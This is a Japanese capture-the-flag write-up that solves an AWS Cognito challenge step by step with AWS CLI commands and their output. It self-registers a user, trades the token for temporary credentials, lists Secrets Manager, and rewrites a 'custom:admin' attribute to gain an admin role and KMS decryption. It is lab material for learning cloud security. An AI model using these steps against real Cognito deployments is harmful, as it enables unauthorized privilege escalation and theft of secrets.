# incogni:Misc:300pts
Can you figure this out?  

[http://incogni-1de3a35e.s3-website.eu-central-1.amazonaws.com/](http://incogni-1de3a35e.s3-website.eu-central-1.amazonaws.com/)  

---

Q1. What is the flag? (Points: 300)  
DCTF{sha256}  

# Solution
S3の静的サイトのURLが渡される。  
ひとまず開くと、ログインフォームのようだ。  
![site.png](site/site.png)  
クレデンシャルなどわかるはずもないが、ソースを見るとJavaScriptから以下の情報が得られた。  
```js
~~~
    const REGION = "eu-central-1";
    const USER_POOL_ID = "eu-central-1_Mpd0FJnm7";
    const USER_POOL_CLIENT_ID = "5ao939ku2uhauj4b69hp99bnk9";
    const IDENTITY_POOL_ID = "eu-central-1:095ae0bb-a02d-40c9-9edc-df464a633790";
~~~
```
Cognitoの設定値のようなので、これを悪用することを考える。  
ここで、User Poolに自己サインアップを行って、Identity Poolから有効なAWSクレデンシャルを取得することを試みる。  
```bash
$ aws cognito-idp sign-up \
  --region eu-central-1 \
  --client-id 5ao939ku2uhauj4b69hp99bnk9 \
  --username satoki@example.com \
  --password P@ssw0rd123!
{
    "UserConfirmed": true,
    "UserSub": "63644822-7051-70bb-02d5-650a2da5d64c"
}
```
自己サインアップが成功したので、IdTokenを取得する。  
```bash
$ REGION='eu-central-1'
$ CLIENT_ID='5ao939ku2uhauj4b69hp99bnk9'
$ USER='satoki@example.com'
$ PASS='P@ssw0rd123!'
$ AUTH_JSON=$(aws cognito-idp initiate-auth \
  --region "$REGION" \
  --client-id "$CLIENT_ID" \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME="$USER",PASSWORD="$PASS")
$ echo "$AUTH_JSON" | jq -r '.AuthenticationResult | {IdToken, AccessToken, ExpiresIn}'
{
  "IdToken": "eyJraWQiOiJxTkRkck90aXJYcXJjS3grWlI5Ym1XdkIzeVwvcEwzZExncDRYUTM5NHpxUT0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI2MzY0NDgyMi03MDUxLTcwYmItMDJkNS02NTBhMmRhNWQ2NGMiLCJjdXN0b206YWRtaW4iOiJmYWxzZSIsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC5ldS1jZW50cmFsLTEuYW1hem9uYXdzLmNvbVwvZXUtY2VudHJhbC0xX01wZDBGSm5tNyIsImNvZ25pdG86dXNlcm5hbWUiOiI2MzY0NDgyMi03MDUxLTcwYmItMDJkNS02NTBhMmRhNWQ2NGMiLCJvcmlnaW5fanRpIjoiOTdmYTg2YmQtOWExOC00N2Q0LWI5MjEtYjg5NDc2MDBkMGI0IiwiYXVkIjoiNWFvOTM5a3UydWhhdWo0YjY5aHA5OWJuazkiLCJldmVudF9pZCI6ImY5OWJhMDU3LTQzZGUtNDQxYi1iOWU4LTQwNWNiMWVlNGUyMiIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzU3ODI1NDAzLCJleHAiOjE3NTc4MjkwMDMsImlhdCI6MTc1NzgyNTQwMywianRpIjoiMjkxODA0MTItZDZlNS00ZGE1LTg4MWYtNDY4NGEwYzQwMzFiIiwiZW1haWwiOiJzYXRva2lAZXhhbXBsZS5jb20ifQ.uN8wloaYYT6EooSMSaz5Hdj6r_ZjE7hJXEi1cePTjRXAyrZdzlhUzO9IVwrQuvV2hFjwVwz3O6BNJP9fdGJUtn5nNtwb90IXNIK7oNKtbzWiV4GPoo8T2xp-weB331Zxa3zy6ZiBlUgyEGsFbVqbXJJvwGfoNuzqOPb2AfVbmqei6lHzPDmViuFCRVw-VZycU_MHEoobW1inHIw1-i3IP9dIdHyHUR7N7hN6yoed05oVjm_OFOTK_dy3B_rfLe-9qiSX3yndrGmgXGt_60_FlwgnrqXkXia1c0zDBFNSwoALBXztYCggn9Sg3M1VKLrvAzdo3qcNW_Z_z7aUZaXZiQ",
  "AccessToken": "eyJraWQiOiJoNFB0SkRmc2p3Y3pzbW1leEdmNlwveTduZllaa1llNkQweVFIRVJxTFVSbz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI2MzY0NDgyMi03MDUxLTcwYmItMDJkNS02NTBhMmRhNWQ2NGMiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuZXUtY2VudHJhbC0xLmFtYXpvbmF3cy5jb21cL2V1LWNlbnRyYWwtMV9NcGQwRkpubTciLCJjbGllbnRfaWQiOiI1YW85MzlrdTJ1aGF1ajRiNjlocDk5Ym5rOSIsIm9yaWdpbl9qdGkiOiI5N2ZhODZiZC05YTE4LTQ3ZDQtYjkyMS1iODk0NzYwMGQwYjQiLCJldmVudF9pZCI6ImY5OWJhMDU3LTQzZGUtNDQxYi1iOWU4LTQwNWNiMWVlNGUyMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NTc4MjU0MDMsImV4cCI6MTc1NzgyOTAwMywiaWF0IjoxNzU3ODI1NDAzLCJqdGkiOiJkZGQ4MTlmZi1hOTUwLTQ5Y2QtYjJmNC03YzA5OGYwMWQyMzciLCJ1c2VybmFtZSI6IjYzNjQ0ODIyLTcwNTEtNzBiYi0wMmQ1LTY1MGEyZGE1ZDY0YyJ9.lpTbonLQwRT6pdaxpjNhjgVoAx5OeTjPiO0X1KuqgbVBREFKs4ZtfsEgV14LaPisi5MCUlpD9x4L_q1SkAaUj9r3y_22ihEaGbt0HS2Pi6v0e124f_5m1VX6TvbXbEA_qVRg6C3TBc3-ZyJVegXJa0A-oVjoC5Hg0oBW6gHwvEZTMWsak_WvnChK4BevKQMzyxP7qIN_LwEK-NyjMZygBpdDimIAMxVuQLtZDX_FVzFLDIZey9HSYmXXVF3ehptsQdgbAeneUEImLyBh4inr5xB9eMPogxhKgwaKD0H6UfOnf602ZpJkMbZy5uHSJCXFBuo_2IyvWDzVKnex5zJi-g",
  "ExpiresIn": 3600
}
```
IdTokenを使って、IdentityIdを取得する。  
```bash
$ USER_POOL_ID='eu-central-1_Mpd0FJnm7'
$ IDENTITY_POOL_ID='eu-central-1:095ae0bb-a02d-40c9-9edc-df464a633790'
$ LOGINS_KEY="cognito-idp.${REGION}.amazonaws.com/${USER_POOL_ID}"
$ ID_TOKEN=$(echo "$AUTH_JSON" | jq -r '.AuthenticationResult.IdToken')
$ IDENTITY_JSON=$(aws cognito-identity get-id \
  --region "$REGION" \
  --identity-pool-id "$IDENTITY_POOL_ID" \
  --logins ${LOGINS_KEY}="$ID_TOKEN")
$ echo "$IDENTITY_JSON"
{
    "IdentityId": "eu-central-1:02af23d6-e244-ce5a-5ff5-13d5f57e82c5"
}
$ IDENTITY_ID=$(echo "$IDENTITY_JSON" | jq -r '.IdentityId')
```
さらにこれを用いて、一時的なAWSクレデンシャルを取得する。  
```bash
$ CREDS_JSON=$(aws cognito-identity get-credentials-for-identity \
  --region "$REGION" \
  --identity-id "$IDENTITY_ID" \
  --logins ${LOGINS_KEY}="$ID_TOKEN")
$ echo "$CREDS_JSON" | jq -r '.Credentials'
{
  "AccessKeyId": "ASIAQFLZD23RHPRADIFB",
  "SecretKey": "jjK+U/IeRc5cgGP7yKoqagPc+Cn1QZsCfhm6vQ9e",
  "SessionToken": "IQoJb3JpZ2luX2VjEN3//////////wEaDGV1LWNlbnRyYWwtMSJHMEUCIQCQGMoskWmgRtt/SL5CEJv0TmdHv9oFzBQzM8lZR3stDgIgDXltbZ90CgRVZyyhJ8YzxQAo8RnS3d1qavmHIq7NcGgq1gQIVhAAGgwwMTE1MjgyOTYxNjIiDHLnQKwGg526dqBYmCqzBBjeXYaycYUT9bYjHx5Y/mRxweFxM6fi0maE+TbCYw44Tg/HnPDJrEiZm1yhR9UY/67C2YQIPBaQqs7M9KgsNCd681oZsfiKz7SII7j+/MxlO8v6sKYf0TWN7xz2nJhIdmR39rzPaEjfLO9MVV7q3tzmUEDGZpoHhQM7RZ5wqp1x6Uk8GFyAu6MgelcORiGfKO1tK/BIAXmmkBnbd8Z8lVv2LPUajOOT3VUvlfikoSdDV9sSctBtjIgrGgbbKUHxRKZmlsBw6o1nzR324wRXlxZi1fn3ys8NA/b/sU+yxJ9eiv+W+ui37ZrsEUd/SeSRSOVu2cxTfiC2xeOUOSOM/zuw5ZsL2rmrtXWLUYQss0UgUALi1/7eROmRlPgrFCFMyHj8hDR6v12OHo3lMuWRvQq8Pqm8kJ08edsVYA7P02SHe6qft1KHfqvoqOH6l+DOxI87O/cQvEaWumt4z7BqNO2yu9Ss7H05GENj7iD4o600vA5ZQTa1JbzUBj23inQEo0FcCukAjND/UVBRD0wMLPIkmXiJs2ppfVo58L9sq9gBzu9b3rhoMyXgsNCzZpW7ZSP2P0Ld9HMbroNWZDwUZ5LBSvx1DrJRSBRdI7ctAq+ZCiUEF6sN7bJiSdOC07656yB+jLj6aOLlUdaeTgmWTzagdRVGBl4UDUe50RyRLHRvmeKpHwK4DLSDBHPj/KrTxYO/xC4EhGUgNmJEbxUQdy+spqvG5UcR6vbhYefE1QUbQa7lMLmUmcYGOoUCPdH0mqsw+cAAr5ry2qcqJaC4IklGe6p+DO+U2j2YP7DQsaLwvKz9FobifRGQRy4DDhJNISh+yjtW/Y9RJ9zxsN1KUOd9bhZ6ubTBcfd7nqT5Wt6eyYxjhd42NyKuMPdY1WDkWKy3AQ6p/4sHtr/S9a9YPjh2QHGs1VonM4+wFWW5+axRSvJoCh/mPeJUXjaptQG3iG4d8xqRbJ8kSE9lQg3TH8V/H8OMIVZL0t3kMY7KK3K/QLuldV5JFrFvywoVDhkFdWkKIcHBQTqt6YHBvzMCFwmlRMmgJGIZb3xt0hd8z/pHLTO5UODknZJFFfDuNIVctecr5aGhEPiOyVLi48gb7Ofm",
  "Expiration": 1757829193
}
$ export AWS_ACCESS_KEY_ID=$(echo "$CREDS_JSON" | jq -r '.Credentials.AccessKeyId')
$ export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.Credentials.SecretKey')
$ export AWS_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Credentials.SessionToken')
$ export AWS_DEFAULT_REGION="$REGION"
$ aws sts get-caller-identity
{
    "UserId": "AROAQFLZD23REJS6YIKDI:CognitoIdentityCredentials",
    "Account": "011528296162",
    "Arn": "arn:aws:sts::011528296162:assumed-role/incogni-user-role-1de3a35e/CognitoIdentityCredentials"
}
```
ユーザーロールのようだ。  
フラグが格納されていそうなSecrets Managerを列挙する。  
```bash
$ aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:eu-central-1:011528296162:secret:incogni/flag-1de3a35e-wPq5Iv",
            "Name": "incogni/flag-1de3a35e",
            "Description": "Encrypted Flag",
            "LastChangedDate": 1757066962.899,
            "LastAccessedDate": 1757808000.0,
            "SecretVersionsToStages": {
                "terraform-20250905095613099300000004": [
                    "AWSPREVIOUS"
                ],
                "terraform-20250905100922788200000001": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1757066168.255
        }
    ]
}
```
フラグらしきものがあるため読み出すが、KMSでさらに暗号化されているようだ。  
```bash
$ aws secretsmanager get-secret-value \
  --region eu-central-1 \
  --secret-id incogni/flag-1de3a35e \
  --query 'SecretString' --output text
None
$ aws secretsmanager get-secret-value \
  --region eu-central-1 \
  --secret-id incogni/flag-1de3a35e \
  --query 'SecretBinary' --output text
AQICAHiOY7I7LxgVsxvNQuH346wlm6maQB6xO10EwJzbgVYNGAFlcHkT/2K5Ov5BZVVq6qvjAAAAqDCBpQYJKoZIhvcNAQcGoIGXMIGUAgEAMIGOBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDHeL7fH5rPdRz1stZAIBEIBhIx+Hn1MOKk6n9a9mP7GxwFy6pPkw0j/oRiwdvMbeLo92DahiSXw/5OpicF3MaLZWTK/PW4Zd7lSKsSd05KT2EGcmrR37A5+f0N50o5yuyyNarPuwxL5mUDT77JEKkRTvGA==
$ aws secretsmanager get-secret-value \
  --region eu-central-1 \
  --secret-id incogni/flag-1de3a35e \
  --query 'SecretBinary' --output text \
| base64 -d > ciphertext.bin
$ aws kms decrypt \
  --region eu-central-1 \
  --ciphertext-blob fileb://ciphertext.bin \
  --query Plaintext --output text \
| base64 -d > flag.txt

An error occurred (AccessDeniedException) when calling the Decrypt operation: User: arn:aws:sts::011528296162:assumed-role/incogni-user-role-1de3a35e/CognitoIdentityCredentials is not authorized to perform: kms:Decrypt on resource: arn:aws:kms:eu-central-1:011528296162:key/79d35eb0-0dba-40f7-b76c-86791cf500a5 because no identity-based policy allows the kms:Decrypt action
```
復号を試みるが、`kms:Decrypt`が許可されていない。  
ここで困って様々な情報調査していると、カスタム属性がついていることに気付く。  
```bash
$ export ACCESS_TOKEN=$(echo "$AUTH_JSON" | jq -r '.AuthenticationResult.AccessToken')
$ aws cognito-idp get-user \
  --region eu-central-1 \
  --access-token "$ACCESS_TOKEN"
{
    "Username": "63644822-7051-70bb-02d5-650a2da5d64c",
    "UserAttributes": [
        {
            "Name": "email",
            "Value": "satoki@example.com"
        },
        {
            "Name": "custom:admin",
            "Value": "false"
        },
        {
            "Name": "sub",
            "Value": "63644822-7051-70bb-02d5-650a2da5d64c"
        }
    ]
}
```
`custom:admin`を`true`にした場合のロールでは`kms:Decrypt`が許可されていないだろうか。  
書き換えを試す。  
```bash
$ aws cognito-idp update-user-attributes \
  --region eu-central-1 \
  --access-token "$ACCESS_TOKEN" \
  --user-attributes Name="custom:admin",Value="true"
$ aws cognito-idp get-user \
  --region eu-central-1 \
  --access-token "$ACCESS_TOKEN"
{
    "Username": "63644822-7051-70bb-02d5-650a2da5d64c",
    "UserAttributes": [
        {
            "Name": "email",
            "Value": "satoki@example.com"
        },
        {
            "Name": "custom:admin",
            "Value": "true"
        },
        {
            "Name": "sub",
            "Value": "63644822-7051-70bb-02d5-650a2da5d64c"
        }
    ]
}
```
成功したので、再度一時的なAWSクレデンシャルを払い出す。  
```bash
$ AUTH_JSON=$(aws cognito-idp initiate-auth \
  --region "$REGION" \
  --client-id "$CLIENT_ID" \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME="$USER",PASSWORD="$PASS")
$ echo "$AUTH_JSON" | jq -r '.AuthenticationResult | {IdToken, AccessToken, ExpiresIn}'
{
  "IdToken": "eyJraWQiOiJxTkRkck90aXJYcXJjS3grWlI5Ym1XdkIzeVwvcEwzZExncDRYUTM5NHpxUT0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI2MzY0NDgyMi03MDUxLTcwYmItMDJkNS02NTBhMmRhNWQ2NGMiLCJjdXN0b206YWRtaW4iOiJ0cnVlIiwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLmV1LWNlbnRyYWwtMS5hbWF6b25hd3MuY29tXC9ldS1jZW50cmFsLTFfTXBkMEZKbm03IiwiY29nbml0bzp1c2VybmFtZSI6IjYzNjQ0ODIyLTcwNTEtNzBiYi0wMmQ1LTY1MGEyZGE1ZDY0YyIsIm9yaWdpbl9qdGkiOiI5ZmQxYWNhYi1mOGVjLTQwMmItODE5YS1iZmNkODc3YWRhNDQiLCJhdWQiOiI1YW85MzlrdTJ1aGF1ajRiNjlocDk5Ym5rOSIsImV2ZW50X2lkIjoiM2UxNjFhYTEtZjE4ZS00Mzc4LTliNDQtMGRkZjNkN2Q5NjY5IiwidG9rZW5fdXNlIjoiaWQiLCJhdXRoX3RpbWUiOjE3NTc4MjY3MTIsImV4cCI6MTc1NzgzMDMxMiwiaWF0IjoxNzU3ODI2NzEyLCJqdGkiOiI2YTg5M2ZjMy01OTQ1LTRkMzktYTVlNC0zOGRkZTY3ZjExNzkiLCJlbWFpbCI6InNhdG9raUBleGFtcGxlLmNvbSJ9.mZQYCiaKafoA-ycoKVRDVUHpLbZ4F3TnCdOY4DUeXWdKg0LMuEgXhUg9Xu3USWWefzU4fjeagLvMwC0ELldZvtIsdI6kzSbBnP-tf7IRqXi0NvsNcpCC51VwI7jTQYgxqtxMrQsYnpmTqvLIfVm_7XNo6vmUIuFiByblPb16AzhSh9TGl3XZCmwivj--qFH15S5qm-K1e97PwhDwfkYyymQsyj9yTNc2U_vGtUyl9UiL3vSbP0EOT0PPfjpWlA6S3ge66FykGkFFI80Gb7BnScuU2SIdvOD76DWlbi_NzcHiyiTqWaxJ0acowxz_2BhpcPhL1rLLBwgjPoOEa-D7ew",
  "AccessToken": "eyJraWQiOiJoNFB0SkRmc2p3Y3pzbW1leEdmNlwveTduZllaa1llNkQweVFIRVJxTFVSbz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI2MzY0NDgyMi03MDUxLTcwYmItMDJkNS02NTBhMmRhNWQ2NGMiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuZXUtY2VudHJhbC0xLmFtYXpvbmF3cy5jb21cL2V1LWNlbnRyYWwtMV9NcGQwRkpubTciLCJjbGllbnRfaWQiOiI1YW85MzlrdTJ1aGF1ajRiNjlocDk5Ym5rOSIsIm9yaWdpbl9qdGkiOiI5ZmQxYWNhYi1mOGVjLTQwMmItODE5YS1iZmNkODc3YWRhNDQiLCJldmVudF9pZCI6IjNlMTYxYWExLWYxOGUtNDM3OC05YjQ0LTBkZGYzZDdkOTY2OSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NTc4MjY3MTIsImV4cCI6MTc1NzgzMDMxMiwiaWF0IjoxNzU3ODI2NzEyLCJqdGkiOiI2NDc5YTRlNi0yOThkLTQ1NjAtYTIyZC1kNzZiZTcxNzRhODQiLCJ1c2VybmFtZSI6IjYzNjQ0ODIyLTcwNTEtNzBiYi0wMmQ1LTY1MGEyZGE1ZDY0YyJ9.xsDHJ_gMAqYmrZNNl1SAgMBGFDIK-UWem20Tnp_Fib4xM2-8kV7NXpnG26jP33rSeyQOIV1_tdQU7LdRzlepGBXHFhoJgAXQkcgYJFpNyXDVjvDe8X8lORuyZ3fPQ8Zlp4z4UAcWITZNp0KcxSX7rv8TtViQCPKOFm3yB9o2eXBJw3eWivdrQAyUO5swQlaUftREBtV92xUe4oQQ4LTnbApOk_-WuBUV5jnFPYBC9ARC5b18Y6k3nZEP3CAAJuy0MFGXiU2odG1HAYp9AXCAn0vE1z9zZMCjT_HlFLqfjEGXMjfiSVzvojb_75-mE_L7TAi9kzARvjv8h4WpT7qZSQ",
  "ExpiresIn": 3600
}
$ ID_TOKEN=$(echo "$AUTH_JSON" | jq -r '.AuthenticationResult.IdToken')
$ IDENTITY_JSON=$(aws cognito-identity get-id \
  --region "$REGION" \
  --identity-pool-id "$IDENTITY_POOL_ID" \
  --logins ${LOGINS_KEY}="$ID_TOKEN")
$ IDENTITY_ID=$(echo "$IDENTITY_JSON" | jq -r '.IdentityId')
$ CREDS_JSON=$(aws cognito-identity get-credentials-for-identity \
  --region "$REGION" \
  --identity-id "$IDENTITY_ID" \
  --logins ${LOGINS_KEY}="$ID_TOKEN")
$ echo "$CREDS_JSON" | jq -r '.Credentials'
{
  "AccessKeyId": "ASIAQFLZD23RP2NKYXMW",
  "SecretKey": "vNkBuU7gioP0LoJuNw/atfFkFmbWEffW7h/ZcngP",
  "SessionToken": "IQoJb3JpZ2luX2VjEN3//////////wEaDGV1LWNlbnRyYWwtMSJIMEYCIQC7MXL04AkWfoGQkgJ482QbmGJi8Nvi+Lsc42N/0q32+wIhAO9yxIwbNNZX9oLuCW0L/Obbex278Lu//fwKyC1edcN/KtYECFYQABoMMDExNTI4Mjk2MTYyIgxdaLId7Jd4FX3WJWUqswT5h6NRErjZ4Z8V9oWQsJNJC3ePvnIST5wInHvJIVydByDUavvTn1f9C60D5IXnvTsUjYx7pdcJjad1gEU46iNOpQYSdbaCae2FRVf3drk4HvmAzfymhe18ymI5w3sjZSQO7d55OhihOqOWiWMeXO0+9yRkgMecdPTzKncKcXHlTeN6xWAazC8tkVvB2IYEooQRBIQEREaxckmoUakgDzOvus96o+dq6cSGh7/E1Wf0bLK5ohRMYXx2OcDJxJKA4n8TTkg6Iu78qKPD3XvBQIAOdhMF7YEfnxiZyPDoxxm4WCx49lyPAkPG+BTYli62JDIHpCtZn0HvwmmaVY3gDfqJiU/j5VCjP+nQjZdrF+16u1fzbty6Op8XaSRivZYDoZTNrmUtQdVeEDJ+wcwY6NOvppgPT1cIq2gtwYI1WCXxToUBU3ES1e6EiZww/kqQxVgnhJLEGanhnIyS8PYwIrRYo+fM8DCbtEGxa42dH1ZbPvIpcNnpYgkeOzVnXGQzCw6rY8uGQNb32L3mVKFWLjauN0wa/51nHJJjwPX727Koyaha2M/2ger6aJ0t2rZ8wvgDtF4JjgcP3MU+QDAVqq2wV02hqXsNLVjFW+PfT2WoLhA8stfEy4IpEr9dHbwYw4UzzmemxGnPjdffztd9Tdxc+SUdvPmT6SibL1Bk3WuzJ2UHjb15z6QvDYjX2k+vbv7NfMZSaV+neLNB4DGvPa1XShJnYirCZMgIoRFQxwl5IjTIlzC7nZnGBjqEAn5F3pHafPiAJgAxBtxCyWFnqcE+hQgHD8bbkM75akUA/AVeu5QRQ3t2J6Dhbc4Yzc+TlG17Ubtkg2eP5v6hlqY0EkAniCAZYH7NoNUU/BRibbApg3sD/bm2ccTs7hpiByX4Hnn56sKm9aYSiGUNiU5D0rxFTsJgxGZ+J6yhN0EDRacLdW12XuO9zJqsfVyKVmhHvoaCoYm5sE/BUCbSGWZgc+3JP0qqLb/PZsKZtUTAgVStXOKL/a9Asww14Fk3GfWdgyUTYR5qhGB+A+Xd7lKWPIrzBqh9fVG4uvL5HVe+v2paFNr/xJ/vqI3G+qDwkff48p4+HeOK9qb6aaXuhlVi86ml",
  "Expiration": 1757830347
}
$ export AWS_ACCESS_KEY_ID=$(echo "$CREDS_JSON" | jq -r '.Credentials.AccessKeyId')
$ export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.Credentials.SecretKey')
$ export AWS_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Credentials.SessionToken')
$ aws sts get-caller-identity
{
    "UserId": "AROAQFLZD23RLQLDIZH5A:CognitoIdentityCredentials",
    "Account": "011528296162",
    "Arn": "arn:aws:sts::011528296162:assumed-role/incogni-admin-role-1de3a35e/CognitoIdentityCredentials"
}
```
アドミンロールとなった。  
再度復号を試す。  
```bash
$ aws secretsmanager get-secret-value \
  --region eu-central-1 \
  --secret-id incogni/flag-1de3a35e \
  --query 'SecretBinary' --output text \
| base64 -d > ciphertext.bin
$ aws kms decrypt \
  --region eu-central-1 \
  --ciphertext-blob fileb://ciphertext.bin \
  --query Plaintext --output text \
| base64 -d > flag.txt
$ cat flag.txt
DCTF{05b29909949c22b35a9594c1610267469009e492dfd27323b789d6649d0ccc11}
```
成功して、flagが得られた。  

## DCTF{05b29909949c22b35a9594c1610267469009e492dfd27323b789d6649d0ccc11}